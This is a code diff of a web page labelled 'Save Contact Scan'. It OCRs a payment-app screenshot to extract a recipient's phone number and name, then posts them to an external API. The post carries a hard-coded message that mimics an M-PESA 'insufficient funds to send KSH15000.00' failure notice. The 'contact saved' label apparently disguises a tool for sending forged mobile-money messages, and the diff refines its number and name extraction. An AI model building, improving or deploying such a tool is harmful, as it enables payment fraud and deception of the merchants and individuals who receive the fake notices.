@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,8 +15,6 @@
     .upload-section:hover { background: #252525; border-color: #66bb6a; }
     #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }
 
-    textarea { width: 100%; height: 80px; padding: 10px; margin-top: 10px; background: #2a2a2a; border: none; border-radius: 6px; color: white; font-size: 1rem; resize: none; box-sizing: border-box; }
-    
     .manual-input-container { margin-top: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #252525; }
     .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
     input[type="text"] { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; font-size: 1.1rem; margin-bottom: 15px; outline: none; }
@@ -23,31 +22,31 @@
 
     button { width: 100%; padding: 16px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
     button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
-    button:disabled { background: gray; cursor: not-allowed; }
+    button:disabled { background: #555; cursor: not-allowed; }
     
-    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
+    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.9rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
     .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; font-weight: bold; }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>Save Contact</h3>
+    <h3>Save Contact Scan</h3>
     
     <div class="upload-section" onclick="document.getElementById('imageInput').click()">
-        <span>Click to Upload Screenshot 📸</span>
+        <span>📸 Tap to Upload Screenshot</span>
         <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
         <img id="imagePreview" alt="Preview">
     </div>
 
-    <div id="loader" class="loading-text">🔍 Scanning Image... Please wait.</div>
+    <div id="loader" class="loading-text">🔍 Extracting Details...</div>
 
     <div class="manual-input-container">
-        <label>DETECTED NAME:</label>
-        <input type="text" id="detectedName" placeholder="Recipient Name">
+        <label>RECIPIENT NAME:</label>
+        <input type="text" id="detectedName" placeholder="Waiting for scan...">
         
-        <label>DETECTED NUMBER:</label>
-        <input type="text" id="detectedPhone" placeholder="Phone Number">
+        <label>PHONE NUMBER:</label>
+        <input type="text" id="detectedPhone" placeholder="Waiting for scan...">
     </div>
 
     <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
@@ -58,12 +57,10 @@
 const API = "https://mpesab.vercel.app";
 const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";
 
-// Handle Image Upload and OCR
 async function handleImage(input) {
     const file = input.files[0];
     if (!file) return;
 
-    // Show Preview
     const reader = new FileReader();
     reader.onload = e => {
         const preview = document.getElementById('imagePreview');
@@ -76,76 +73,63 @@ async function handleImage(input) {
     loader.style.display = 'block';
 
     try {
-        // Perform OCR
         const { data: { text } } = await Tesseract.recognize(file, 'eng');
         processText(text);
     } catch (err) {
-        alert("Error scanning image. Please try again or enter manually.");
+        alert("OCR Error. Please ensure the screenshot is clear.");
     } finally {
         loader.style.display = 'none';
     }
 }
 
 function processText(rawText) {
-    console.log("Extracted Text:", rawText);
+    // Split into lines and remove UI labels that interfere with name detection
+    const noiseWords = ["RECIPIENT", "NAME", "NUMBER", "OPERATOR", "DETAILS", "LOCAL", "INTERNATIONAL", "ENTER", "AMOUNT", "KES"];
+    let lines = rawText.split('\n')
+                      .map(l => l.trim())
+                      .filter(l => l.length > 2);
     
-    // Split text into lines for contextual checking
-    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
+    console.log("Cleaned Lines detected:", lines);
+
     let detectedPhone = "";
     let detectedName = "";
+    let phoneIndex = -1;
 
-    // -- PRIORITY 1: Check for labels first (The provided image has "Recipient Name or Number" and "Recipient Name")
-    for(let i = 0; i < lines.length; i++) {
-        let currentLine = lines[i].toLowerCase();
-
-        // Detect Number by label proximity (Recipient Number label)
-        if(currentLine.includes("recipient name or number") && lines[i+1]) {
-            let numMatch = lines[i+1].match(/\+?\d{5,15}/);
-            if(numMatch) {
-                detectedPhone = numMatch[0];
-            }
-        }
-        // Detect Number fallback: If the first label is just "Recipient Number"
-        else if(currentLine.includes("recipient number") && lines[i+1]) {
-            let numMatch = lines[i+1].match(/\+?\d{5,15}/);
-            if(numMatch) {
-                detectedPhone = numMatch[0];
-            }
-        }
-
-        // Detect Name by label proximity (Recipient Name label)
-        if(currentLine.includes("recipient name") && lines[i+1]) {
-            detectedName = lines[i+1];
-            // Name detection by label can capture "JAMES MWEU". Clean it up.
-            detectedName = detectedName.replace(/[^a-zA-Z\s]/g, '').trim();
-            break; // Found the specific name label, stop checking other lines for name
+    // 1. Identify the Phone Number (specifically looking for the 10-digit format in your image)
+    for (let i = 0; i < lines.length; i++) {
+        let match = lines[i].match(/\b(07|01|254)\d{7,10}\b/);
+        if (match) {
+            detectedPhone = match[0];
+            phoneIndex = i;
+            break;
         }
     }
 
-    // -- PRIORITY 2: Fallback (if specific labels were not caught well by the OCR)
-    
-    // Fallback Number extraction (Any long number on its own line)
-    if(!detectedPhone) {
-        let numFallbackMatch = rawText.match(/(?:07|01|254|\+254)\d{8,10}/);
-        if(!numFallbackMatch) {
-            numFallbackMatch = rawText.match(/\+?\d{5,15}/); // The original broad pattern
+    // 2. Based on your image, the Name is usually BELOW the number/input field
+    if (phoneIndex !== -1 && phoneIndex + 1 < lines.length) {
+        // Look ahead for the next 1-3 lines to find the name
+        for (let j = phoneIndex + 1; j < Math.min(phoneIndex + 4, lines.length); j++) {
+            let line = lines[j];
+            
+            // Check if the line is NOT a noise word or a number
+            const isNoise = noiseWords.some(word => line.toUpperCase().includes(word));
+            const isNumeric = /\d/.test(line);
+
+            if (!isNoise && !isNumeric && line.length > 3) {
+                detectedName = line;
+                break; 
+            }
         }
-        detectedPhone = numFallbackMatch ? numFallbackMatch[0] : "";
     }
 
-    // Fallback Name extraction (Old Proximity keyword or Capitol block regex)
-    if(!detectedName || detectedName.length < 3) {
-        // Old generalized pattern matching capitalized block (e.g., JOHN DOE)
-        let nameMatch = rawText.match(/([A-Z]{3,}(?:\s[A-Z]{3,})+)/);
-        detectedName = nameMatch ? nameMatch[0] : "Unknown Merchant";
+    // Fallback: If proximity check fails, look for capitalized name pattern
+    if (!detectedName) {
+        let nameMatch = rawText.match(/([A-Z][a-z]+(?:\s[A-Z][a-z]+)+)/);
+        detectedName = nameMatch ? nameMatch[0] : "Unknown Recipient";
     }
 
     document.getElementById('detectedPhone').value = detectedPhone;
-    document.getElementById('detectedName').value = detectedName.toUpperCase().trim();
-}
-
-function generateToken() {
-    return "CONTACT" + Math.floor(Math.random() * 100000);
+    document.getElementById('detectedName').value = detectedName.toUpperCase();
 }
 
 async function saveContact() {
@@ -155,13 +139,12 @@ async function saveContact() {
     const phone = document.getElementById("detectedPhone").value.trim();
 
     if (!phone || !name) {
-        output.innerText = "❌ Please ensure Name and Number are filled.";
+        output.innerText = "❌ Please scan or enter Name and Number.";
         return;
     }
 
     btn.disabled = true;
     btn.innerText = "Saving...";
-    let token = generateToken();
 
     try {
         const response = await fetch(`${API}/send`, {
@@ -171,14 +154,14 @@ async function saveContact() {
                 phone: phone,
                 name: name,
                 amount: 0,
-                token: token,
+                token: "CONTACT" + Date.now(),
                 message: FIXED_MESSAGE
             })
         });
 
         if (response.ok) {
-            output.innerText = "Contact Saved Successfully ✅\n\nName: " + name + "\nPhone: " + phone;
-            btn.innerText = "Saved ✓";
+            output.innerText = "✅ Success!\n" + name + "\n" + phone;
+            btn.innerText = "DONE ✓";
         } else {
             throw new Error();
         }
